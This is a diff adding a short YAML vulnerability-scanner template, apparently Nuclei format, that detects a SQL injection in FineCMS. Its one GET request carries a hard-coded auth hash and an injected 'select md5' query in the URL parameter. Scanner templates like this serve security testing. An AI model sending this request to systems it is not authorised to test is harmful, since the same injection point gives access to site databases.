@@ -1,0 +1,12 @@
+id: yaml-poc-finecms-finecms-sql_injection-CT-158611
+info:
+  name: Yaml Poc Finecms Finecms Sql_Injection Ct 158611
+  author: converted
+  severity: high
+  description: 'Converted from xpoc: yaml-poc-finecms-finecms-sql_injection-CT-158611'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{rand}})%27
